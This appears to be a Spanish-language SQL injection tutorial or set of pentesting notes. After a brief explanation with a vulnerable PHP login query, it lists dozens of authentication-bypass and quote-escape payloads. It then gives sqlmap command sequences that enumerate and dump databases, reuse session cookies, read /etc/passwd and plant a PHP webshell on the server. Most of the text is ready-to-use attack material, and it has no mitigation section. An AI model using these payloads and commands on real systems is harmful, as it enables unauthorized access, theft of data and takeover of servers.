## ¿qué es una sqli inyection?

Una SQL Injection es un tipo de ataque que ocurre cuando un atacante es capaz de "inyectar" código SQL malicioso en una consulta que se envía a su base de datos.

👉 En otras palabras: el atacante logra manipular las consultas a la base de datos para que hagan cosas no deseadas, como:

  obtener datos confidenciales,

  modificar o eliminar datos,

  saltarse controles de autenticación,

  ejecutar comandos administrativos en la base de datos.

 ## 📌 ¿Por qué ocurre?

 Sucede cuando una aplicación web no valida correctamente la entrada del usuario antes de usarla en una consulta SQL.

 🔍 Ejemplo sencillo

Supongamos que en una página de login tiene este código en PHP:
```
$username = $_POST['username'];
$password = $_POST['password'];

$query = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
```
Si el atacante en el campo password escribe:
```
' OR '1'='1
```
La consulta que se ejecuta es:
```
SELECT * FROM users WHERE username = 'admin' AND password = '' OR '1'='1'
```
Como '1'='1' siempre es verdadero, es posible que el atacante logre iniciar sesión sin conocer la contraseña.


## 🔍 ¿cómo detectamos si tiene esta vulnerabilidad?
Cuando vemos campos a rellenar intentaremos inyectar y veremos la respuesta
lo primero es intentar escapar del contexto actual con:
```
 [Nothing]
'
"
`
')
")
`)
'))
"))
`))
```
y luego corregimos la consulta.
podemos automatizarlo con diccionarios como seclist que incluye muchos payloads y atendermos a la respuesta.
las inyecciones más comunes para hacer de forma manual son:
```
" or 1=1
" or 1=1#
" or 1=1--
" or 1=1/*
' or 1=1
' or 1=1#
' or 1=1--
' or 1=1/*
admin" #
admin" --
admin" or "1"="1
admin" or "1"="1"#
admin" or "1"="1"--
admin" or "1"="1"/*
admin" or 1=1
admin" or 1=1#
admin" or 1=1--
admin" or 1=1/*
admin") or "1"="1
admin") or "1"="1"#
admin") or "1"="1"--
admin") or "1"="1"/*
admin") or ("1"="1
admin") or ("1"="1"#
admin") or ("1"="1"--
admin") or ("1"="1"/*
admin"/*
admin"or 1=1 or ""="
admin' #
admin' --
admin' or '1'='1
admin' or '1'='1'#
admin' or '1'='1'--
admin' or '1'='1'/*
admin' or 1=1
admin' or 1=1#
admin' or 1=1--
admin' or 1=1/*
admin') or '1'='1
admin') or '1'='1'#
admin') or '1'='1'--
admin') or '1'='1'/*
admin') or ('1'='1
admin') or ('1'='1'#
admin') or ('1'='1'--
admin') or ('1'='1'/*
admin'/*
admin'or 1=1 or ''='
or 1=1
or 1=1#
or 1=1--
or 1=1/*
```

## 🤖 Automatizar el ataque

Podemos automatizar el ataque con herramientas como `sqlmap`.

### 1️⃣ Buscar bases de datos

Usamos la herramienta sobre la URL para buscar las bases de datos:

```bash
sqlmap -u http://<IP> --forms --dbs --batch
```

### 2️⃣ Enumerar las tablas

Si detecta bases de datos, inspeccionamos las tablas de una base de datos específica:

```bash
sqlmap -u http://<IP> --forms -D <NOMBRE_BASE_DE_DATOS> --tables --batch
```

### 3️⃣ Enumerar las columnas

Una vez tengamos las tablas, inspeccionamos las columnas que las componen:

```bash
sqlmap -u http://<IP> --forms -D <NOMBRE_BASE_DE_DATOS> -T <NOMBRE_DE_LA_TABLA> --columns --batch
```

### 4️⃣ Extraer los datos

Cuando sepamos las columnas, le indicamos que nos muestre la información de las filas y columnas seleccionadas:

```bash
sqlmap -u http://<IP> --forms -D <NOMBRE_BASE_DE_DATOS> -T <NOMBRE_DE_LA_TABLA> -C <NOMBRE_DE_LA_COLUMNA_1>,<NOMBRE_DE_LA_COLUMNA_2> --dump --batch
```

---

## 🎯 Ataques avanzados con SQLMap

Una vez que tenemos el ataque básico automatizado, podemos realizar técnicas más avanzadas:

### 🔹 Especificar el parámetro vulnerable

Si sabemos qué parámetro es vulnerable (por ejemplo `id`):

```bash
sqlmap -u "http://<IP>/pagina.php?id=1" -p id --dbs --batch
```

### 🔹 Aumentar el nivel y riesgo del ataque

SQLMap permite personalizar la agresividad del ataque:

```bash
sqlmap -u http://<IP> --forms --dbs --risk=3 --level=5 --batch
```

- `--risk=3`: permite payloads más agresivos (por defecto es `1`).
- `--level=5`: explora más tipos de inyecciones (por defecto es `1`).

### 🔹 Usar cookies (si la aplicación requiere autenticación)

Si la aplicación requiere sesión iniciada, podemos añadir la cookie:

```bash
sqlmap -u http://<IP> --cookie="PHPSESSID=XXXXXXXXXXXXX" --dbs --batch
```

### 🔹 Obtener el usuario actual de la base de datos

```bash
sqlmap -u http://<IP> --current-user --batch
```

### 🔹 Obtener la versión del motor de base de datos

```bash
sqlmap -u http://<IP> --banner --batch
```

### 🔹 Leer archivos del sistema (si es posible)

Si la inyección es lo suficientemente potente, podemos intentar leer archivos:

```bash
sqlmap -u http://<IP> --file-read="/etc/passwd" --batch
```

### 🔹 Escribir archivos en el servidor (WebShell)

```bash
sqlmap -u http://<IP> --file-write="shell.php" --file-dest="/var/www/html/shell.php" --batch
```

---

